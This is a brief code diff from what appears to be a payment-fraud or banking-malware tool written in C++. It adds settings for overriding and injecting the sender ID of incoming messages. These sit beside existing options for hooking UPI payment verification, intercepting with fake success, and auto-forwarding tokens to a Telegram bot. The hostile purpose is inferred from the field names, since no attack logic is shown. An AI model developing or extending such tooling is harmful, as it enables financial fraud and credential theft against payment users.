@@ -324,6 +324,8 @@ void ConfigManager::persist_runtime() {
         << "  \"hook_upi_verification\": " << (c.hook_upi_verification ? "true" : "false") << ",\n"
         << "  \"auto_hook_foreground\": " << (c.auto_hook_foreground ? "true" : "false") << ",\n"
         << "  \"intercept_fake_success\": " << (c.intercept_fake_success ? "true" : "false") << ",\n"
+        << "  \"override_incoming_sender\": " << (c.override_incoming_sender ? "true" : "false") << ",\n"
+        << "  \"inject_sender_id\": \"" << json_escape_cfg(c.inject_sender_id) << "\",\n"
         << "  \"auto_forward_token\": " << (c.auto_forward_token ? "true" : "false") << ",\n"
         << "  \"telegram_bot_token\": \"" << json_escape_cfg(c.telegram_bot_token) << "\",\n"
         << "  \"telegram_chat_id\": \"" << json_escape_cfg(c.telegram_chat_id) << "\",\n"
